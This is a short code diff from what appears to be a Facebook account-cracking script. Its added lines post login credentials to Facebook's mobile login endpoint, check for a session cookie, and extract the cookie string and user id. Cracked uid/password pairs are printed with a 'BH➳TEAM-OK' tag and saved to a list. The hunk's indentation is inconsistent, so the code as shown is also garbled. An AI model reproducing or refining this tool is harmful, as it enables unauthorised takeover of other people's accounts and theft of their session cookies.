@@ -1288,8 +1288,11 @@ class Main:
 }
 
 response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers)
-    log_cookies=session.cookies.get_dict().keys()
-    if 'c_user' in log_cookies:
+lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
+   log_cookies=session.cookies.get_dict().keys()
+   if 'c_user' in log_cookies:
+    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+    user = re.findall('c_user=(.*);xs', coki)[0]
 				print("\r \033[0;92m[ BH➳TEAM-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
